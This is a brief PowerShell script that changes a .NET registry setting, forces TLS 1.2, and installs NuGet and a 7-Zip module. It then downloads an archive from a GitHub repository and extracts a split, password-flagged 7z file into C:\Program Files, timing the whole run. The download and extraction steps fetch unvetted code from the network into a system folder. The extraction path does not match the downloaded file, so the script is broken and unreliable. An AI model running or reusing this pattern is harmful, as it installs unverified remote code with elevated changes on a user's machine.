measure-command {

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Install-PackageProvider -Name NuGet -force

Install-Module -Name 7Zip4Powershell -force

invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\app64.zip"
Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -TargetPath "C:\Program Files\"


} |

select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
